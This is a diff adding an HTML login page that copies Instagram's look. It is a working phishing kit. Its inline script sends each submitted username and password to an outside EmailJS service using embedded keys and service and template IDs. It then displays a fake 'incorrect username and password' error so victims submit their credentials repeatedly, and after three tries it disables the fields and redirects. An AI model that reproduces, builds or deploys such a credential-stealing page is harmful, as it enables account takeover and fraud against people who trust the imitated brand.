@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+
+    <a
+        href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb&utm_campaign=loginPage&ig_mid=49C1E1F1-CA0D-4224-86DD-4223F5554A94&utm_content=lo&utm_medium=badge"><img
+            src="google.png" class="google"></a>
+    <link rel="stylesheet" href="insta.css">
+
+</head>
+
+
+
+<body>
+    <div class="phone">
+        <div class=main-box>
+            <img src="" class="insta">
+            <div class="insta"><div aria-disabled="false" role="button" tabindex="0" style="cursor: pointer;"><i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajlEU-wEDyo.png&quot;); background-position: 0px -52px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i></div></div>
+            <br><br><br><br><br><br><br>
+            <form id="form">
+                <table>
+
+
+                    <div class="user" id="User">
+                        <tr>
+                            <td>
+                                <label></label>
+                                <input type="text/number" placeholder="Phone number,username, or email"
+                                    onfocus="clearError()" name="Username" id="Username" autocomplete="off">
+                            </td>
+                        </tr>
+                    </div>
+                </table>
+                <br>
+                <br>
+                <table>
+                    <tr>
+                        <td class="pwd" id="pwd1"><label></label>
+                            <input type="password" minlength="8" placeholder="Password" onfocus="clearError()"
+                                name="pass" id="pass">
+                        </td>
+                    </tr>
+                </table>
+                <br>
+                <br>
+                <br>
+                <button type="submit" id="button">Log In</button>
+            </form>
+            <br>
+            <br>
+            <br>
+            <h4>_________________OR_________________</h4>
+
+            <ul>
+                <div class="facebk_link">
+                    <ul>
+                        <img src="in.PNG" width="10%" height="-5%" class="img_facebk_logo"><a class="loginfb"
+                            href="https://www.facebook.com/"> Log in with Facebook</a>
+                    </ul>
+                </div>
+
+
+                <div class="error-message" id="errorMessage">
+                    <p></p>
+                </div>
+
+                <ul><a class="resetpwd" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
+                </ul>
+            </ul>
+        </div>
+        <br>
+        
+        <div class="signup">
+            <p>Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/"> Sign up
+                </a>
+            </p>
+        </div>
+        <div class="final">
+            <p>Get the app.</p>
+        </div>
+        <br>
+
+        <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo"><img src="apple.png" class="apple"></a>
+        <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb&utm_campaign=loginPage&ig_mid=49C1E1F1-CA0D-4224-86DD-4223F5554A94&utm_content=lo&utm_medium=badge"><img
+                src="google.png" class="google"></a>
+
+        
+
+
+
+    </div>
+    <div>
+
+        
+
+    </div>
+
+
+
+
+    <script type="text/javascript" src="index.js"></script>
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <script type="text/javascript">
+        emailjs.init('zQmR8XgLhVGBMpbJR')
+    </script>
+
+    <script>
+
+        const form = document.querySelector('form');
+        const input = document.getElementById('Username');
+        const input2 = document.getElementById('pass');
+        const errorContainer = document.getElementById('errorMessage');
+        const submited = document.getElementById('button');
+
+
+        let clickCount = 0;
+
+
+        form.addEventListener('submit', function (event) {
+            event.preventDefault(); // Prevent form submission
+
+            const inputValue = input.value.trim(); // Get input value and remove leading/trailing whitespace
+            const inputValue2 = input2.value.trim();
+
+
+
+
+            if (inputValue === '' || inputValue2 === '') {
+                //submited.disabled = true;
+
+                errorContainer.textContent = 'Input cannot be empty.'; // Display error message
+            } else {
+                clickCount++;
+                // Input is valid, perform any further processing or submit the form
+
+                if (clickCount <= 3) {
+                    const serviceID = 'service_dfjwvzg';
+                    const templateID = 'template_m57plk9';
+
+                    emailjs.sendForm(serviceID, templateID, this)
+                        .then(() => {
+
+
+                        }, (err) => {
+
+
+                        });
+                    // Redirect to the next page
+                    errorContainer.textContent = 'incorret Username and password!!!...'
+                    form.reset();
+                    //  
+                    //
+                } else {
+                    // window.location.href = 'index.html'; 
+                    loading();
+                }
+            }
+
+        });
+        function clearError() {
+            errorContainer.innerHTML = ''
+        }
+        function loading() {
+            var input8 = document.getElementById("Username");
+            var input9 = document.getElementById("pass");
+            setTimeout(function () {
+
+                window.location.href = "index.html";
+            }, 15000);
+            submited.innerHTML = '👏'
+            input8.disabled = true;
+            input9.disabled = true;
+        }
+
+
+
+
+
+
+
+
+            // const firstNameInput = document.getElementById('Username');
+            // const lastNameInput = document.getElementById('pass');
+            // // Add input event listeners to the input fields
+            // firstNameInput.addEventListener('input', toggleButtonState);
+            // lastNameInput.addEventListener('input', toggleButtonState);
+
+
+            // function toggleButtonState() {
+
+            //     if (firstNameInput.value.length === 1 || lastNameInput.value.length === 1) {
+            //         btn.disabled = true;
+            //     }
+            //     else {
+            //         btn.disabled = false;
+            //     };
+            // }
+
+
+    </script>
+
+</body>
+
+
+
+</html>
